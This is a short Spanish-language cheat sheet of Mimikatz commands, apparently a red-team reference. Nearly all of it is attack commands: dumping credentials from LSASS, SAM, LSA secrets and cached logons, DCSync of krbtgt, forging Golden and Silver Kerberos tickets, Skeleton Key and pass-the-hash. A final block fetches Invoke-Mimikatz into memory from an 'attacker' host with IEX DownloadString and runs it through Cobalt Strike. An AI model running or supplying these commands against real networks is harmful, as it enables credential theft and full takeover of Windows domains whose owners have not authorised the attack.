# Mimikatz

La herramienta de referencia para extracción de credenciales en Windows.

#### Uso básico

```powershell
# Ejecutar con privilegios de debug
privilege::debug

# Dump completo de credenciales en LSASS
sekurlsa::logonpasswords

# Solo hashes NTLM
sekurlsa::msv

# Tickets Kerberos en memoria
sekurlsa::tickets /export

# SAM (cuentas locales)
lsadump::sam

# LSA Secrets
lsadump::secrets

# Credenciales cacheadas
lsadump::cache

# DCSync
lsadump::dcsync /user:krbtgt /domain:empresa.local
lsadump::dcsync /all /domain:empresa.local /csv

# Golden Ticket
kerberos::golden /user:Administrator /domain:empresa.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt

# Silver Ticket
kerberos::golden /user:Administrator /domain:empresa.local /sid:DOMAIN_SID /target:target.empresa.local /service:cifs /rc4:SERVICE_HASH /ptt

# Importar ticket
kerberos::ptt ticket.kirbi

# Skeleton Key
misc::skeleton

# Pass-the-Hash abriendo proceso
sekurlsa::pth /user:Administrator /domain:empresa.local /ntlm:NTHASH /run:cmd.exe
```

#### Ejecución sin binario en disco

```powershell
# Cargar desde URL en memoria
IEX (New-Object System.Net.Webclient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
Invoke-Mimikatz -DumpCreds

# Via Cobalt Strike o otro C2
execute-assembly /path/to/mimikatz.exe
```
